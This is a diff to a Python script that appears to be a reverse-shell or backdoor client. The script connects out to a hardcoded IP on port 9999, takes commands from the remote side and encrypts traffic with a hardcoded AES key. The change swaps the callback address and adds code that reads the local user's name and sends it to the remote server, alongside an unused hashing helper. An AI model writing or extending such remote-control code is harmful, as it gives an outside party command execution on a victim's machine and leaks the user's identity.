@@ -2,6 +2,26 @@ import socket
 import os
 import subprocess
 from Crypto.Cipher import AES
+import getpass
+import hashlib
+
+
+def getUserName():
+    username = getpass.getuser()
+    return username
+
+
+def hash_string(input_string, method="sha256"):
+    try:
+        hash_func = getattr(hashlib, method)
+    except AttributeError:
+        return "error"
+
+    hashed = hash_func(input_string.encode()).hexdigest()
+    return hashed
+
+
+
 
 def pad(text):
     while len(text) % 16 != 0:
@@ -16,7 +36,7 @@ def encrypt(text, key):
     return encrypted_bytes
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = '192.168.137.138'
+host = '192.168.152.117'
 port = 9999
 key = "secret123"
 
@@ -27,7 +47,9 @@ while True:
     command = data.decode("utf-8")
 
     if command == "server up!":
+        myName=getUserName()
         s.send(encrypt("password", key))
+        s.send(myName.encode())
 
     elif command[:2] == 'cd':
         try:
